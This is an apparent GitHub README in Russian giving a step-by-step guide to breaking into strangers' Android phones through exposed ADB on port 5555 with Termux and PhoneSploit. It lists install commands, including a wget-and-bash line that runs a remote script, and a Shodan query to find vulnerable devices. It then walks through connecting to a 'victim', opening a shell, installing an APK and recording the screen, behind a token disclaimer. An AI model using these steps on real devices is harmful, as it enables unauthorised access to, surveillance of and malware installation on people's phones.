### android-hack-for-ip_TERMUX

# !!!ВНИМАНИЕ!!!
## Автор данной статьи не несе отвествености за любите действия ВЗЛОМА все создано ТОЛЬКО в ознакомительных целях.

Adb - это консольное приложения для компьютера, с помощью которого производится откладка андроид устройств и позволяет управлять ими.
Как известно android debug bridge прослушивается на порту 5555, поэтому мы можем получить доступ к жертве с открытым портом. Поможет нам в этом утилита под названием phonesploit. Данную утилиту можно установить в линукс, даже в виндовс практически без проблем, а вот в термукс придется постараться чуть по больше)

1.Установка

Первым делом мы обновляем пакеты термукс, и устанавливаем гит:

pkg update

pkg upgrade

pkg install git

#### Далее мы устанавливаем ADB , делается это с помощью скрипта :

apt update > /dev/null 2>&1 && apt --assume-yes install wget > /dev/null 2>&1 && wget https://github.com/MasterDevX/Termux-ADB/raw/master/InstallTools.sh -q && bash InstallTools.sh

#### Теперь мы возвращаемся в домашнюю директорию, командой:

cd 

---

#### Теперь мы приступаем к установке самого Phonesploit :

git clone https://github.com/cyberknight777/PhoneSploit

cd PhoneSploit

bash termux.sh

Отлично, мы установили данную утилиту, теперь перейдём к использованию.
2.Использование.
Первое о чём бы я хотел поговорить, так это о том где же можно взять ip адреса с такой уязвимостью? Ответ очень прост - shodan.

---

Shodan - это поисковая система, которая позволяет пользователю находить компьютеры и устройства, используя определенные фильтры. 
Первым делом там необходимо зарегистрироваться, это делается очень просто, так что сами разберетесь)
После того как вы зарегистрируетесь, вам необходимо в поиск вписать такой запрос :
android debug bridge product:”Android Debug Bridge”
Этот запрос найдет утройства имеющие такую уязвимость, как adb. 
Теперь можно перейти к нашему скрипту, для его запуска потребуются следующие команды :

cd $HOME

cd PhoneSploit 

python2 main_linux.py

Нас встречает такое меню, первым делом нам необходимо подключиться к жертве, для этого мы выбираем пункт:

[3]Connect a new phone

#### После удачного подключения, мы можем использовать любой пункт данного меню, соответствено в пределе разумного, ведь не забывайте про дисклеймер)
#### Останавливаться на каждом пункте мы не будем, ибо это у нас займет много времени, тут все предельно ясно - если перевести на русский. Обращу внимание на пункты:

 [4]. Access Shell on a phone - этот пункт позволяет открыть нам терминал shell и управлять устройством.  

[5]. Install an apk on a phone - этот пункт позволяет установить нам апк файл на устройство жертвы. (давайте поработайте фантазией)

[6,7]. Screenshot/record a phone - позволяет сделать снимок экрана, или записать короткое видео экрана. 

На этом я закончу. Еще раз хочу напомнить, что думайте о последствиях своих действий, спасибо за внимание)

###### By DeplayGo - Spike YT
###### By mishakorzhik
